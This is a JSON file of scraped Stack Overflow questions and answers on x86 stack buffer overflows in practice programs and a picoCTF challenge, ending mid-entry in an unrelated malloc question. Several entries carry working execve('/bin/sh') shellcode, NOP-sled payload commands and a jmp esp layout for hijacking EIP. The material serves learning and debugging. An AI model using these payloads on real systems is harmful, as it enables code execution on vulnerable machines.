[
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int 